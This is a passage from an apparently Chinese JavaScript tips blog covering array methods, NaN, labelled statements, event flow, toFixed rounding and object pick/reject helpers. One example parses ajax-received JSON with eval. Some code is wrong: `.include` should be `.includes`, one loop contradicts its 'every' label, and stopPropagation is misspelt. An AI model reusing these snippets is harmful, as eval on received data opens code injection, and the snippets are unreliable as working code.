<h4 id="Array-prototype-filter-过滤"><a href="#Array-prototype-filter-过滤" class="headerlink" title="Array.prototype.filter()过滤"></a>Array.prototype.filter()过滤</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, , <span class="number">0</span>, <span class="string">''</span>, , <span class="number">4</span>].filter(<span class="function"><span class="keyword">function</span> (<span class="params">item</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> item;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// [1, 2, 3, 4];</span></span><br></pre></td></tr></table></figure>
<p>filter 为数组中的每个元素调用一次 callback 函数，并利用所有使得 callback 返回 true 或 等价于 true 的值 的元素创建一个新数组。callback 只会在已经赋值的索引上被调用，<strong>对于那些已经被删除或者从未被赋值的索引不会被调用</strong>。那些没有通过 callback 测试的元素会被跳过，不会被包含在新数组中。</p>
<p>上述数组如果想要保留零和空字符串的情况，可以</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, , <span class="number">0</span>, <span class="string">''</span>, , <span class="number">4</span>].filter(<span class="function"><span class="keyword">function</span> (<span class="params">item</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> item !== <span class="literal">undefined</span>;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// [1, 2, 3, 0, "", 4];</span></span><br></pre></td></tr></table></figure>
<h3 id="25-求余运算会保留符号"><a href="#25-求余运算会保留符号" class="headerlink" title="25 求余运算会保留符号"></a>25 求余运算会保留符号</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(<span class="number">-9</span> % <span class="number">3</span>); <span class="comment">// -0</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="number">-4</span> % <span class="number">3</span>); <span class="comment">// -1</span></span><br></pre></td></tr></table></figure>
<h3 id="26-诡异的-NaN"><a href="#26-诡异的-NaN" class="headerlink" title="26 诡异的 NaN"></a>26 <strong>诡异</strong>的 NaN</h3><p>NaN(not a number), 非常诡异的存在。NaN 与任何值不相符，包括它本身。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(<span class="built_in">Boolean</span>(<span class="literal">NaN</span>)); <span class="comment">// false</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="literal">NaN</span> == <span class="literal">false</span>); <span class="comment">// false</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="literal">NaN</span> == <span class="literal">NaN</span>); <span class="comment">// false</span></span><br></pre></td></tr></table></figure>
<h3 id="27-Array-prototype-concat-为何效率没有-push-高？"><a href="#27-Array-prototype-concat-为何效率没有-push-高？" class="headerlink" title="27 Array.prototype.concat 为何效率没有 push 高？"></a>27 Array.prototype.concat 为何效率没有 push 高？</h3><p>合并数组最先想到的便是 Array.prototype.concat()方法，但是实际上通过 Array.prototype.push()也能实现数组的合并：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// es6</span></span><br><span class="line">arr1.push(...arr2);</span><br></pre></td></tr></table></figure>
<p>其 babel 转为 ES5 后：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arr1.push.apply(arr1, arr2);</span><br></pre></td></tr></table></figure>
<p>并且通过 push 方法实现合并比 concat 效率更高，原因在于其实现的底层源码，</p>
<p>先说 concat：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> arr3 = [];</span><br><span class="line"></span><br><span class="line"><span class="comment">// add arr1</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; arr1Length; i++) &#123;</span><br><span class="line">  arr3[i] = arr1[i];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// add arr2</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; arr2Length; i++) &#123;</span><br><span class="line">  arr3[arr1Length + i] = arr2[i];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>push：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; arr2Length; i++) &#123;</span><br><span class="line">  arr1[arr1Length + i] = arr2[i];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>两者的区别在于 push 方法在实现中直接修改第一个数组。</p>
<h3 id="28-数组功能的利用"><a href="#28-数组功能的利用" class="headerlink" title="28 数组功能的利用"></a>28 数组功能的利用</h3><h4 id="判断内容"><a href="#判断内容" class="headerlink" title="判断内容"></a>判断内容</h4><p>很多情况下需要对变量进行判断处理，大多做法是通过<code>||</code>，但利用数组我们可以做到更加清晰以及易维护：<br>如</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// bad</span></span><br><span class="line"><span class="keyword">if</span> (value === <span class="string">'apple'</span> || value === <span class="string">'banana'</span> || value === <span class="string">'orange'</span>) &#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可改为</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// good</span></span><br><span class="line"><span class="keyword">if</span> ([<span class="string">'apple'</span>, <span class="string">'banana'</span>, <span class="string">'orange'</span>].include(value)) &#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="判断是否全部匹配-Array-prototype-every"><a href="#判断是否全部匹配-Array-prototype-every" class="headerlink" title="判断是否全部匹配 Array.prototype.every()"></a>判断是否全部匹配 <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Array/every" target="_blank" rel="noopener">Array.prototype.every()</a></h4><p>在一个数组字典中（<code>[{...}, {...}]</code>）判断一个变量是否通过所有数组测试，大多做法是使用 for 循环，但利用 Array.prototype.every()方法可以更简洁</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// bad</span></span><br><span class="line"><span class="keyword">let</span> _arr = [</span><br><span class="line">  &#123; <span class="attr">key</span>: <span class="string">'apple'</span>, <span class="attr">num</span>: <span class="number">2</span> &#125;,</span><br><span class="line">  &#123; <span class="attr">key</span>: <span class="string">'banana'</span>, <span class="attr">num</span>: <span class="number">10</span> &#125;,</span><br><span class="line">  &#123; <span class="attr">key</span>: <span class="string">'orange'</span>, <span class="attr">num</span>: <span class="number">15</span> &#125;,</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> bool = <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> item <span class="keyword">of</span> _arr) &#123;</span><br><span class="line">  <span class="keyword">if</span> (item.num &lt;= value) &#123;</span><br><span class="line">    bool = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// good</span></span><br><span class="line"><span class="keyword">let</span> _arr = [</span><br><span class="line">  &#123; <span class="attr">key</span>: <span class="string">'apple'</span>, <span class="attr">num</span>: <span class="number">2</span> &#125;,</span><br><span class="line">  &#123; <span class="attr">key</span>: <span class="string">'banana'</span>, <span class="attr">num</span>: <span class="number">10</span> &#125;,</span><br><span class="line">  &#123; <span class="attr">key</span>: <span class="string">'orange'</span>, <span class="attr">num</span>: <span class="number">15</span> &#125;,</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> bool = _arr.every(<span class="function"><span class="params">item</span> =&gt;</span> item.num &lt;= value);</span><br></pre></td></tr></table></figure>
<h4 id="判断是否存在匹配-Array-prototype-some"><a href="#判断是否存在匹配-Array-prototype-some" class="headerlink" title="判断是否存在匹配 Array.prototype.some()"></a>判断是否存在匹配 <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Array/some" target="_blank" rel="noopener">Array.prototype.some()</a></h4><p>在一个数组字典中（<code>[{...}, {...}]</code>）判断一个变量是否在数组中，大多做法是使用 for 循环，但利用 Array.prototype.some()方法可以更简洁</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// bad</span></span><br><span class="line"><span class="keyword">let</span> _arr = [</span><br><span class="line">  &#123; <span class="attr">key</span>: <span class="string">'apple'</span>, <span class="attr">color</span>: <span class="string">'red'</span> &#125;,</span><br><span class="line">  &#123; <span class="attr">key</span>: <span class="string">'banana'</span>, <span class="attr">color</span>: <span class="string">'yellow'</span> &#125;,</span><br><span class="line">  &#123; <span class="attr">key</span>: <span class="string">'orange'</span>, <span class="attr">color</span>: <span class="string">'orange'</span> &#125;,</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> bool = <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> item <span class="keyword">of</span> _arr) &#123;</span><br><span class="line">  <span class="keyword">if</span> (item.key === value) &#123;</span><br><span class="line">    bool = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// good</span></span><br><span class="line"><span class="keyword">let</span> _arr = [</span><br><span class="line">  &#123; <span class="attr">key</span>: <span class="string">'apple'</span>, <span class="attr">color</span>: <span class="string">'red'</span> &#125;,</span><br><span class="line">  &#123; <span class="attr">key</span>: <span class="string">'banana'</span>, <span class="attr">color</span>: <span class="string">'yellow'</span> &#125;,</span><br><span class="line">  &#123; <span class="attr">key</span>: <span class="string">'orange'</span>, <span class="attr">color</span>: <span class="string">'orange'</span> &#125;,</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> bool = _arr.some(<span class="function"><span class="params">item</span> =&gt;</span> item.key === value);</span><br></pre></td></tr></table></figure>
<h3 id="29-label-statement"><a href="#29-label-statement" class="headerlink" title="29 label statement"></a>29 label statement</h3><p>有这么个需求，</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(i);</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> j = <span class="number">0</span>; j &lt; <span class="number">5</span>; j++) &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(j);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'done'</span>);</span><br></pre></td></tr></table></figure>
<p>我想要当 j = 2 的时候就退出所有的 for 语句，打印最后的 done ，你会怎么做？</p>
<p>可能有的同学会想到这样：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(i);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> j = <span class="number">0</span>; j &lt; <span class="number">5</span>; j++) &#123;</span><br><span class="line">      <span class="built_in">console</span>.log(j);</span><br><span class="line">      <span class="keyword">if</span> (j === <span class="number">2</span>) <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">foo();</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'done'</span>);</span><br></pre></td></tr></table></figure>
<p>这样可以实现，但是又多写了一个函数，那么有没有别的办法呢？</p>
<blockquote>
<p>在 JavaScript 中，语句优先。也就是说，如果一段代码既能够以语句的方式解析，也能用语法的方式解析，在 JS 中，会优先按语句来解析。</p>
</blockquote>
<p>比如：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  a: <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在 JS 中，{}既可以代表代码块，又可以作为 Object 的语法标志。<br>那么我们前面说过，JS 是语句优先的，当一段代码既可以按照语句解析，又可以按照语法解析的时候，会优先按语句解析。</p>
<p>当把{}当做是代码块的时候，里面的 a : 1，返回 1。因此上面的需求可这样写：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">aa: &#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(i);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> j = <span class="number">0</span>; j &lt; <span class="number">5</span>; j++) &#123;</span><br><span class="line">      <span class="built_in">console</span>.log(j);</span><br><span class="line">      <span class="keyword">if</span> (j === <span class="number">2</span>) <span class="keyword">break</span> aa;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'done'</span>);</span><br></pre></td></tr></table></figure>
<p>aa 是标签声明，包裹一个代码块，break 的作用是跳出当前的循环，本来是无法跳出外面那层 for 循环的，但是 break aa，这里跳出了整个代码块。</p>
<p>当然，这种写法是完全不提倡的，这里只是用来说明 JS 中的 Label Statement 这个特性。</p>
<p>同样的，这也是 eval 函数中如下需要添加<code>()</code>的原因</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 假设str是你通过ajax接收到的JSON串</span></span><br><span class="line"><span class="keyword">var</span> str = <span class="string">'&#123;"name": "liu", "age": 20&#125;'</span>;</span><br><span class="line"><span class="keyword">var</span> obj = <span class="built_in">eval</span>(<span class="string">'('</span> + str + <span class="string">')'</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(obj);</span><br></pre></td></tr></table></figure>
<p>这也是立即执行函数的原理，更多可见<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Statements/label" target="_blank" rel="noopener">mdn-label</a></p>
<h3 id="30-浏览器的事件流"><a href="#30-浏览器的事件流" class="headerlink" title="30 浏览器的事件流"></a>30 浏览器的事件流</h3><p>事件行的整个过程称之为事件流，分为三个阶段：<strong>事件捕获阶段，事件目标处理函数、事件冒泡</strong>。</p>
<ul>
<li>当某个元素触发某个事件时（如：click），顶级对象 document 发出一个事件流，顺着 dom 的树节点向触发它的目标节点流去，直到达到目标元素，这个层层递进，向下找目标的过程为事件的捕获阶段，此过程与事件相应的函数是不会触发的。</li>
<li>到达目标函数，便会执行绑定在此元素上的，与事件相应的函数，即事件目标处理函数阶段。</li>
<li>最后，从目标元素起，再依次往顶层元素对象传递，途中如果有节点绑定了同名事件，这些事件所对应的函数，在此过程中便称之为事件冒泡。通常情况下，事件相应的函数四在冒泡阶段执行的。addEventListener 的第三个参数默认为 false，表示冒泡阶段执行（为 true 的时候，表示捕获阶段执行）。使用<code>e.stopPropgation()</code>或<code>e.cancelBubble = true</code>(IE)可以阻断事件向当前元素的父元素冒泡。</li>
</ul>
<p><a href="https://www.w3.org/TR/DOM-Level-3-Events/#event-flow" target="_blank" rel="noopener">&gt;&gt;浏览器的事件流</a></p>
<h4 id="事件传播的三个阶段：捕获，目标对象，冒泡。"><a href="#事件传播的三个阶段：捕获，目标对象，冒泡。" class="headerlink" title="事件传播的三个阶段：捕获，目标对象，冒泡。"></a>事件传播的三个阶段：捕获，目标对象，冒泡。</h4><ul>
<li>1.捕获（Capture）是事件对象(event object) 从 window 派发到 目标对象父级的过程。</li>
<li>2.目标（Target）阶段是事件对象派发到目标元素时的阶段，如果事件类型指示其不冒泡，那事件传播将在此阶段终止。</li>
<li>3.冒泡（Bubbling）阶段和捕获相反，是以目标对象父级到 window 的过程。<br>在任一阶段调用 stopPropagation 都将终止本次事件的传播。</li>
</ul>
<h3 id="31-2-55-toFixed-1"><a href="#31-2-55-toFixed-1" class="headerlink" title="31 2.55.toFixed(1)"></a>31 <code>2.55.toFixed(1)</code></h3><p>由于 js 遵循 IEEE 754 规范，采用双精度存储（double precision），导致出现如下问题</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="number">2.55</span>).toFixed(<span class="number">1</span>); <span class="comment">// '2.5'</span></span><br></pre></td></tr></table></figure>
<p>按理论上它应该四舍五入为’2.6’，<br>可通过如下简单修正（无法完全避免）：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="built_in">Number</span>.prototype._toFixed) &#123;</span><br><span class="line">  <span class="built_in">Number</span>.prototype._toFixed = <span class="built_in">Number</span>.prototype.toFixed;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">Number</span>.prototype.toFixed = <span class="function"><span class="keyword">function</span> (<span class="params">n</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">this</span> + <span class="number">1e-14</span>)._toFixed(n);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>再调用：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="number">2.55</span>).toFixed(<span class="number">1</span>); <span class="comment">// '2.6'</span></span><br></pre></td></tr></table></figure>
<p>其原因可见<a href="https://www.rrfed.com/2017/11/19/js-number-tofixed/" target="_blank" rel="noopener">《为什么(2.55).toFixed(1)等于 2.5？》</a></p>
<h3 id="32"><a href="#32" class="headerlink" title="32 [,,,]"></a>32 <code>[,,,]</code></h3><p>js 可以解析如<code>[,,,]</code>这种逗号分隔的空值数组，但结果其实是<code>[empty, empty, empty]</code>，<br>如：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [, , ,];</span><br><span class="line"><span class="built_in">console</span>.log(arr.length); <span class="comment">// 3</span></span><br></pre></td></tr></table></figure>
<h3 id="33-诡异的-Function-length"><a href="#33-诡异的-Function-length" class="headerlink" title="33 诡异的 Function.length"></a>33 诡异的 Function.length</h3><p>Function 的 length 属性指明函数的<strong>形参个数</strong>。</p>
<p>如</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(<span class="built_in">Function</span>.length); <span class="comment">/* 1 */</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;&#125;.length); <span class="comment">/* 0 */</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="function"><span class="keyword">function</span> (<span class="params">a</span>) </span>&#123;&#125;.length); <span class="comment">/* 1 */</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="function"><span class="keyword">function</span> (<span class="params">a, b</span>) </span>&#123;&#125;.length); <span class="comment">/* 2 etc. */</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="function"><span class="keyword">function</span> (<span class="params">...args</span>) </span>&#123;&#125;.length);</span><br><span class="line"><span class="comment">// 0, rest parameter is not counted</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="function"><span class="keyword">function</span> (<span class="params">a, b = <span class="number">1</span>, c</span>) </span>&#123;&#125;.length);</span><br><span class="line"><span class="comment">// 1, only parameters before the first one with a default value is counted</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>ES6 函数指定了默认值以后，函数的 length 属性将返回没有指定默认值的参数个数。也就是说，指定了默认值后，length 属性将失真。</p>
</blockquote>
<h3 id="34-Object-Array-lt-Object-gt-属性过滤方法"><a href="#34-Object-Array-lt-Object-gt-属性过滤方法" class="headerlink" title="34 Object/Array&lt;Object&gt; 属性过滤方法"></a>34 Object/Array&lt;Object&gt; 属性过滤方法</h3><h4 id="保留"><a href="#保留" class="headerlink" title="保留"></a>保留</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param <span class="type">&#123;Object&#125;</span> </span>obj: 原始对象</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param <span class="type">&#123;Array&#125;</span> </span>keys: 保留字段</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return <span class="type">&#123;Object&#125;</span></span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">pick</span>(<span class="params">obj, keys</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> keys</span><br><span class="line">    .map(<span class="function"><span class="params">k</span> =&gt;</span> (k <span class="keyword">in</span> obj ? &#123; [k]: obj[k] &#125; : &#123;&#125;))</span><br><span class="line">    .reduce(<span class="function">(<span class="params">res, o</span>) =&gt;</span> <span class="built_in">Object</span>.assign(res, o), &#123;&#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>使用如</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;</span><br><span class="line">  a: <span class="string">'1'</span>,</span><br><span class="line">  b: <span class="number">2</span>,</span><br><span class="line">  c: [<span class="number">345</span>],</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">pick(obj, [<span class="string">'a'</span>, <span class="string">'c'</span>]); <span class="comment">// &#123;a: "1", c: [345]&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Array&lt;object&gt;</span></span><br><span class="line"><span class="keyword">var</span> arr = [&#123; <span class="attr">a</span>: <span class="number">1</span>, <span class="attr">b</span>: <span class="number">3</span>, <span class="attr">c</span>: <span class="number">5</span> &#125;, &#123; <span class="attr">a</span>: <span class="number">1</span> &#125;];</span><br><span class="line"></span><br><span class="line">arr.map(<span class="function"><span class="params">row</span> =&gt;</span> pick(row, [<span class="string">'a'</span>, <span class="string">'c'</span>])); <span class="comment">// [ &#123;a: 1, c: 5&#125;, &#123; a: 1 &#125; ]</span></span><br></pre></td></tr></table></figure>
<h4 id="过滤"><a href="#过滤" class="headerlink" title="过滤"></a>过滤</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param <span class="type">&#123;Object&#125;</span> </span>obj: 原始对象</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param <span class="type">&#123;Array&#125;</span> </span>keys: 过滤字段</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return <span class="type">&#123;Object&#125;</span></span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">reject</span>(<span class="params">obj, keys</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">Object</span>.keys(obj)</span><br><span class="line">    .filter(<span class="function"><span class="params">k</span> =&gt;</span> !keys.includes(k))</span><br><span class="line">    .map(<span class="function"><span class="params">k</span> =&gt;</span> <span class="built_in">Object</span>.assign(&#123;&#125;, &#123; [k]: obj[k] &#125;))</span><br><span class="line">    .reduce(<span class="function">(<span class="params">res, o</span>) =&gt;</span> <span class="built_in">Object</span>.assign(res, o), &#123;&#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>或</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param <span class="type">&#123;Object&#125;</span> </span>obj: 原始对象</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param <span class="type">&#123;Array&#125;</span> </span>keys: 过滤字段</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return <span class="type">&#123;Object&#125;</span></span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">reject</span>(<span class="params">obj, keys</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> vkeys = <span class="built_in">Object</span>.keys(obj).filter(<span class="function"><span class="params">k</span> =&gt;</span> !keys.includes(k));</span><br><span class="line">  <span class="keyword">return</span> pick(obj, vkeys);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>使用如</p>
